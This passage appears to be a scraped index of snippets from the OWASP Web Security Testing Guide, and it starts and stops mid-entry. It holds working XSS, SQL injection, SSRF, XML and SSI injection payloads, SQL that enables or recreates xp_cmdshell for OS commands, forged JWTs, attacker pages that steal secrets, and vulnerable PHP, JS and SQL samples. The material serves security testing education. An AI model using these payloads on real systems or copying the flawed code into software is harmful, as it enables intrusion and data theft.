http\nCODE:\n```\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n----------------------------------------\n\nTITLE: Malicious HTML Injection Example for Stored XSS\nDESCRIPTION: Example of how an attacker might inject malicious code by breaking out of the input tag's value attribute and inserting a script tag that would execute when the page loads.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\"> MALICIOUS CODE <!-- />\n```\n\n----------------------------------------\n\nTITLE: Vulnerable JavaScript Code Using innerHTML for HTML Injection\nDESCRIPTION: This code snippet demonstrates a vulnerable implementation that allows HTML injection through the innerHTML property. It extracts a user parameter from the URL without sanitizing it and directly inserts it into the page's DOM, allowing potential injection of malicious HTML or JavaScript.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nvar userposition=location.href.indexOf(\"user=\");\nvar user=location.href.substring(userposition+5);\ndocument.getElementById(\"Welcome\").innerHTML=\" Hello, \"+user;\n```\n\n----------------------------------------\n\nTITLE: Vulnerable User Class Definition in Java\nDESCRIPTION: A Java class representing a User object with properties including a security-sensitive isAdmin boolean field. This model demonstrates a potential mass assignment vulnerability target.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class User {\n   private String username;\n   private String password;\n   private String email;\n   private Boolean isAdmin;\n\n   //Getters & Setters\n}\n```\n\n----------------------------------------\n\nTITLE: HTTP POST Request Example for SQL Injection Testing\nDESCRIPTION: This example shows a complete HTTP POST request that can be used to test for SQL injection vulnerabilities in a password reset form. The single quote in the email parameter is intended to cause an SQL error.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_4\n\nLANGUAGE: txt\nCODE:\n```\nPOST /forgotpass.asp HTTP/1.1\nHost: vulnerable.web.app\n[...]\nReferer: https://vulnerable.web.app/forgotpass.asp\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 50\n\nemail=%27&whichSubmit=submit&submit.x=0&submit.y=0\n```\n\n----------------------------------------\n\nTITLE: SSTI Testing in Code Context - Broken Response\nDESCRIPTION: This test payload attempts to disrupt template processing by injecting a tag, resulting in a blank or partial response that helps confirm the vulnerability.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_5\n\nLANGUAGE: text\nCODE:\n```\npersonal_greeting=username<tag>\nHello\n```\n\n----------------------------------------\n\nTITLE: Error-Based SQL Injection Query\nDESCRIPTION: Demonstrates error-based SQL injection using Oracle's UTL_INADDR.GET_HOST_NAME function to extract data through error messages.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_25\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE id_product=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--\n```\n\n----------------------------------------\n\nTITLE: Malicious JavaScript Injection Example\nDESCRIPTION: Demonstrates how an attacker could inject malicious JavaScript code that creates a CPU-intensive loop within a MongoDB query\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nfunction() { return obj.credits - obj.debits < 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); }\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Whitespace Variations\nDESCRIPTION: Examples of SQL injection attempts using different whitespace patterns to evade detection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_32\n\nLANGUAGE: sql\nCODE:\n```\nor 'a'='a'\n\nor 'a'  =    'a'\n```\n\nLANGUAGE: sql\nCODE:\n```\nor\n'a'=\n        'a'\n```\n\n----------------------------------------\n\nTITLE: Executing System Commands with SSI Exec Directive in HTML\nDESCRIPTION: The exec directive allows execution of system commands on the server. This is the most dangerous SSI directive as it can lead to complete system compromise.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<!--#exec cmd=\"OS_COMMAND\" -->\n```\n\n----------------------------------------\n\nTITLE: Executing GraphQL Introspection Query\nDESCRIPTION: An introspection query that requests complete schema information from a GraphQL API, including query types, mutation types, subscription types, and all available types with their fields, arguments, and descriptions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Administrative Function Access\nDESCRIPTION: Example of attempting to access administrative functions by sending requests to admin-specific endpoints.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nPOST /admin/addUser HTTP/1.1\nHost: www.example.com\n[...]\n\nuserID=fakeuser&role=3&group=grp001\n```\n\n----------------------------------------\n\nTITLE: Vulnerable PHP Include Statement\nDESCRIPTION: A PHP code snippet demonstrating a vulnerable implementation of the include function that accepts user input from a GET parameter without proper validation. This creates a Local File Inclusion vulnerability.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md#2025-04-22_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php include($_GET['file'].\".php\"); ?>\n```\n\n----------------------------------------\n\nTITLE: Creating Custom xp_cmdshell Procedure in SQL Server 2000\nDESCRIPTION: This SQL code creates a custom xp_cmdshell stored procedure using OLE automation objects when the native xp_cmdshell has been disabled. This technique can bypass security restrictions if the attacker has sysadmin rights.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS\n    DECLARE @result int, @OLEResult int, @RunResult int\n    DECLARE @ShellID int\n    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT\n    IF @OLEResult <> 0 SELECT @result = @OLEResult\n    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)\n    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait\n    IF @OLEResult <> 0 SELECT @result = @OLEResult\n    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)\n    EXECUTE @OLEResult = sp_OADestroy @ShellID\n    return @result\n```\n\n----------------------------------------\n\nTITLE: Leaking API Key via Global Variables in JavaScript\nDESCRIPTION: This snippet demonstrates how sensitive data (an API key) stored in a global variable can be leaked through XSSI. The victim's JavaScript file defines a secret, which is then accessed by the attacker's HTML page.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n(function() {\n  window.secret = \"supersecretUserAPIkey\";\n})();\n```\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Leaking data via global variables</title>\n  </head>\n  <body>\n    <h1>Leaking data via global variables</h1>\n    <script src=\"https://victim.com/internal/api.js\"></script>\n    <div id=\"result\">\n    </div>\n    <script>\n      var div = document.getElementById(\"result\");\n      div.innerHTML = \"Your secret data <b>\" + window.secret + \"</b>\";\n    </script>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Leaking API Key via Global Function Parameters in JavaScript\nDESCRIPTION: This example shows how sensitive data can be leaked through global function parameters. The victim's script calls a global function with the secret, which is overwritten by the attacker's script to capture the data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n(function() {\n  var secret = \"supersecretAPIkey\";\n  window.globalFunction(secret);\n})();\n```\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Leaking data via global function parameters</title>\n  </head>\n  <body>\n    <div id=\"result\">\n    </div>\n    <script>\n      function globalFunction(param) {\n        var div = document.getElementById(\"result\");\n        div.innerHTML = \"Your secret data: <b>\" + param + \"</b>\";\n      }\n    </script>\n    <script src=\"https://victim.com/internal/api.js\"></script>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable HTML and JavaScript for CORS-based XSS Attack\nDESCRIPTION: This code demonstrates a vulnerable page where user input controls the URL in a CORS request, potentially allowing an attacker to load malicious content from their own website.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<b id=\"p\"></b>\n<script>\n    function createCORSRequest(method, url) {\n        var xhr = new XMLHttpRequest();\n        xhr.open(method, url, true);\n        xhr.onreadystatechange = function () {\n            if (this.status == 200 && this.readyState == 4) {\n                document.getElementById('p').innerHTML = this.responseText;\n            }\n        };\n        return xhr;\n    }\n\n    var xhr = createCORSRequest('GET', location.hash.slice(1));\n    xhr.send(null);\n</script>\n```\n\n----------------------------------------\n\nTITLE: SSRF Payload to Read Local Files\nDESCRIPTION: HTTP request showing an SSRF payload that attempts to read the /etc/passwd file using the file:// protocol.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nGET https://example.com/page?page=file:///etc/passwd\n```\n\n----------------------------------------\n\nTITLE: Successful XSS Injection HTML Result\nDESCRIPTION: The resulting HTML code after a successful XSS payload injection into an input field. The script tag will execute and display an alert with the user's cookies when the page loads.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\"><script>alert(document.cookie)</script>\n```\n\n----------------------------------------\n\nTITLE: Injecting XML Tags for Privilege Escalation\nDESCRIPTION: Demonstrates how to inject XML tags into user input fields to manipulate the resulting XML structure and potentially gain elevated privileges.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_6\n\nLANGUAGE: txt\nCODE:\n```\nUsername: tony\nPassword: Un6R34kb!e\nE-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com\n```\n\n----------------------------------------\n\nTITLE: Comparing Overpermissive vs Secure HTTP Security Headers\nDESCRIPTION: Examples of overly permissive security header configurations that create vulnerabilities contrasted with more secure implementations that properly restrict access and enhance security.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\nX-Permitted-Cross-Domain-Policies: all\nReferrer-Policy: unsafe-url\n```\n\nLANGUAGE: http\nCODE:\n```\nAccess-Control-Allow-Origin: {theallowedoriginurl}\nX-Permitted-Cross-Domain-Policies: none\nReferrer-Policy: no-referrer\n```\n\n----------------------------------------\n\nTITLE: IP Address Manipulation Header\nDESCRIPTION: HTTP header showing how X-Forwarded-For can be used to spoof a client's IP address. This technique can be used to bypass IP-based restrictions or login attempt rate limiting.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nX-Forwarded-For: 8.1.1.1\n```\n\n----------------------------------------\n\nTITLE: Setting a Cookie with Maximum Security Configuration\nDESCRIPTION: Shows how to set a cookie with the most secure configuration using the __Host- prefix and recommended security attributes including Secure, HttpOnly, and SameSite=Strict.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\nSet-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict\n```\n\n----------------------------------------\n\nTITLE: Enabling xp_cmdshell in SQL Server 2005\nDESCRIPTION: This SQL code enables the xp_cmdshell stored procedure in SQL Server 2005 where it is disabled by default. This requires sysadmin privileges and allows execution of system commands.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nmaster..sp_configure 'show advanced options',1\nreconfigure\nmaster..sp_configure 'xp_cmdshell',1\nreconfigure\n```\n\n----------------------------------------\n\nTITLE: Bit-by-Bit Extraction using Time-Based Blind SQL Injection\nDESCRIPTION: This query extracts the value of a specific bit from a specific byte in a string using timing delays. By cycling through all bits and bytes, an attacker can extract complete information like database names.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nif (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'\n```\n\n----------------------------------------\n\nTITLE: Advanced XML Injection with Comment Technique\nDESCRIPTION: Illustrates an advanced XML injection technique using XML comments to bypass DTD restrictions and still achieve privilege escalation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_9\n\nLANGUAGE: txt\nCODE:\n```\nUsername: tony\nPassword: Un6R34kb!e</password><!--\nE-mail: --><userid>0</userid><mail>s4tan@hell.com\n```\n\n----------------------------------------\n\nTITLE: Vulnerable PHP Password Reset Link Generation\nDESCRIPTION: PHP code showing how password reset functionality often uses the Host header value to create reset links, which can be exploited if the header is not validated properly.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$reset_url = \"https://\" . $_SERVER['HTTP_HOST'] . \"/reset.php?token=\" .$token;\nsend_reset_email($email,$rset_url);\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Parameter Modification for Authentication Bypass in HTML\nDESCRIPTION: This snippet shows how modifying a URL parameter can potentially bypass authentication. It demonstrates sending a GET request with a modified 'authenticated' parameter to gain unauthorized access.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\nhttps://www.site.com/page.asp?authenticated=no\n\nraven@blackbox /home $nc www.site.com 80\nGET /page.asp?authenticated=yes HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Sat, 11 Nov 2006 10:22:44 GMT\nServer: Apache\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<HTML><HEAD>\n</HEAD><BODY>\n<H1>You Are Authenticated</H1>\n</BODY></HTML>\n```\n\n----------------------------------------\n\nTITLE: Outputting Variable Values with SSI Echo Directive in HTML\nDESCRIPTION: The echo directive allows outputting the value of server variables. This is a basic SSI directive that can be used to test for SSI injection vulnerabilities.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<!--#echo var=\"VAR\" -->\n```\n\n----------------------------------------\n\nTITLE: SQL Injection in GraphQL Query\nDESCRIPTION: This example shows how to test for SQL injection vulnerabilities in a GraphQL query by exploiting a parameter concatenation weakness.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_3\n\nLANGUAGE: graphql\nCODE:\n```\nquery sqli {\n  dogs(namePrefix: \"ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- \", limit: 1000) {\n    id\n    name\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Complete JWT with ECDSA Psychic Signature Attack\nDESCRIPTION: Example of a complete JWT with a tampered payload and the ECDSA psychic signature value that exploits the vulnerability in Java 15-18 implementations.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_5\n\nLANGUAGE: txt\nCODE:\n```\neyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA\n```\n\n----------------------------------------\n\nTITLE: Server Data Insertion into JavaScript Variables\nDESCRIPTION: Examples of how server data might be inserted into JavaScript code, which could lead to DOM-based XSS if the data is not properly escaped before insertion.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nvar data = \"<escaped data from the server>\";\nvar result = someFunction(\"<escaped data from the server>\");\n```\n\n----------------------------------------\n\nTITLE: Bypassing XSS Filters with Obfuscation\nDESCRIPTION: These examples show various techniques to obfuscate XSS payloads to bypass signature-based filters, including mixed case, spaces, and URL encoding.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n\"><script >alert(document.cookie)</script >\n```\n\nLANGUAGE: text\nCODE:\n```\n\"><ScRiPt>alert(document.cookie)</ScRiPt>\n```\n\nLANGUAGE: text\nCODE:\n```\n\"%3cscript%3ealert(document.cookie)%3c/script%3e\n```\n\n----------------------------------------\n\nTITLE: Parameter Comment Injection in Oracle PL/SQL\nDESCRIPTION: This code demonstrates how SQL comment syntax (--) can be used to manipulate the execution flow in PL/SQL Gateway. This technique allows for bypassing intended parameter handling and enables SQL injection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\n..\norasso.home();--=>:);--);\n..\n```\n\n----------------------------------------\n\nTITLE: Testing PATCH Method in RESTful API\nDESCRIPTION: Shows how to use the PATCH method in a RESTful API to modify a specific property of a user object. This example uses JSON Patch format as defined in RFC 6902.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_11\n\nLANGUAGE: http\nCODE:\n```\nPATCH /api/users/foo HTTP/1.1\nHost: example.org\n\n{ \"op\": \"replace\", \"path\": \"/role\", \"value\": \"admin\" }\n```\n\n----------------------------------------\n\nTITLE: Injecting a Stolen Access Token in OAuth Flow\nDESCRIPTION: Example of how to intercept and replace an access token in an OAuth Implicit Flow. The example shows replacing a valid token 'dGVzdGluZwo=' with a leaked token 'ZXhhbXBsZQo=' during authentication.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n1. Intercept the traffic between the client and the authorization server.\n2. Start an OAuth flow with a client using the Implicit Flow grant type.\n3. Inject the stolen access token:\n    - Send a forged authorization response with the stolen access token (`ZXhhbXBsZQo=`) to the client.\n    - Intercept a valid authorization response and replace the access token (`dGVzdGluZwo=`) with the leaked one (`ZXhhbXBsZQo=`).\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Dynamic Reporting Query in SQL Server\nDESCRIPTION: Example of a SQL Server stored procedure for dynamic reporting that is vulnerable to SQL injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_30\n\nLANGUAGE: sql\nCODE:\n```\nCreate\nprocedure get_report @columnamelist varchar(7900)\nAs\nDeclare @sqlstring varchar(8000)\nSet @sqlstring  = '\nSelect ' + @columnamelist + ' from ReportTable'\nexec(@sqlstring)\nGo\n```\n\n----------------------------------------\n\nTITLE: Malicious Request/Response Example\nDESCRIPTION: Example of malicious HTTP request and response showing how an attacker can inject and execute arbitrary content through CORS.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_9\n\nLANGUAGE: html\nCODE:\n```\nGET /file.php HTTP/1.1\nHost: attacker.bar\n[...]\nReferer: https://example.foo/main.php\norigin: https://example.foo\n\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 92\nContent-Type: text/html\n\nInjected Content from attacker.bar <img src=\"#\" onerror=\"alert('Domain: '+document.domain)\">\n```\n\n----------------------------------------\n\nTITLE: Malicious HTML Injection Payload Example\nDESCRIPTION: This example shows a malicious URL payload that exploits HTML injection vulnerabilities. It injects an image tag with an onerror event handler that executes arbitrary JavaScript code when the browser attempts to load the non-existent image.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttps://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable PHP Function in Twig Template Engine\nDESCRIPTION: This PHP function from the Extreme Vulnerable Web Application project demonstrates a vulnerability where user input is directly passed to call_user_func, enabling SSTI exploitation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function getFilter($name)\n{\n        [snip]\n        foreach ($this->filterCallbacks as $callback) {\n        if (false !== $filter = call_user_func($callback, $name)) {\n            return $filter;\n        }\n    }\n    return false;\n}\n```\n\n----------------------------------------\n\nTITLE: Java ECDSA Psychic Signature Attack Example\nDESCRIPTION: Example of a tampered JWT using the ECDSA 'psychic signatures' vulnerability (CVE-2022-21449) that affects Java versions 15-18. The specific signature value bypasses signature verification.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_4\n\nLANGUAGE: txt\nCODE:\n```\nMAYCAQACAQA\n```\n\n----------------------------------------\n\nTITLE: Object Identifier Manipulation Example in API Requests\nDESCRIPTION: Example of manipulating a user ID in an API request URL to attempt accessing another user's profile, which could reveal a BOLA vulnerability if authorization checks are not properly implemented.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nGET /api/users/123/profile\nGET /api/users/124/profile\n```\n\n----------------------------------------\n\nTITLE: Testing Client Credentials Grant with cURL\nDESCRIPTION: Bash command using cURL to test the Client Credentials grant type. This example shows how to request a token from the authorization server using client_id and client_secret for machine-to-machine authentication.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ curl --request POST \\\n  --url https://as.example.com/oauth/token \\\n  --header 'content-type: application/json' \\\n  --data '{\"client_id\":\"<some_client_id>\",\"client_secret\":\"<some_client_secret>\",\"grant_type\":\"client_credentials\"}' --proxy https://localhost:8080/ -k\n```\n\n----------------------------------------\n\nTITLE: Reflected CSS Injection Vulnerability in PHP\nDESCRIPTION: This PHP code snippet shows a reflected CSS injection vulnerability where user input from a GET parameter is directly inserted into a style tag without sanitization, allowing an attacker to inject malicious CSS.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<style>\np {\n    color: <?php echo $_GET['color']; ?>;\n    text-align: center;\n}\n</style>\n```\n\n----------------------------------------\n\nTITLE: SQL Server Error Message Example\nDESCRIPTION: This code snippet shows a typical error message that might be returned by Microsoft SQL Server when a SQL injection attack causes an unclosed quotation mark in the query, potentially revealing information about the database structure.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: asp\nCODE:\n```\nMicrosoft OLE DB Provider for ODBC Drivers error '80040e14'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the\ncharacter string ''.\n/target/target.asp, line 113\n```\n\n----------------------------------------\n\nTITLE: Obtaining Public Key for Algorithm Confusion Attack\nDESCRIPTION: Shell command to extract a public key from a TLS certificate, which might be used in an algorithm confusion attack if the same key is used for both TLS and JWT signing.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\nopenssl s_client -connect example.org:443 | openssl x509 -pubkey -noout\n```\n\n----------------------------------------\n\nTITLE: ORDER BY Column Enumeration Technique\nDESCRIPTION: SQL injection technique using ORDER BY to determine the number of columns in a query result set. This is a crucial first step for successfully crafting UNION-based injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nhttps://www.example.com/product.php?id=10 ORDER BY 10--\n```\n\n----------------------------------------\n\nTITLE: None Algorithm Attack Resulting Token Example\nDESCRIPTION: Example of a modified JWT with the 'none' algorithm applied. The token has the header and payload encoded in base64, with an empty signature section (trailing period).\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_3\n\nLANGUAGE: 